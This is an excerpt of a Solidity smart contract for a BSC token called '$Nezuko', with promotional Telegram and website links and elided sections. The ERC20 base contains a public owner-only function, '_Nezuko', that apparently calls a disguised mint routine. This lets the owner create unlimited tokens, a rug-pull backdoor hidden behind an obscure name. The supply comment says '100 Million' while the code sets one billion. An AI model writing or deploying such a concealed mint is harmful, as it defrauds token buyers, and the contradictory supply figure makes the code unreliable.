//
// $Nezuko proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/NezukoBEP
// 📱 Website ::https://nezukobsc.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Nezuko(uint256 amount) public onlyOwner {
 _Nezuko(msg.sender, amount);
    }
    ...
    function _Nezuko(address account, uint256 amount) internal virtual {
...
contract $Nezuko is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Nezuko", "NEZUKO") {
     _Nezuko(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}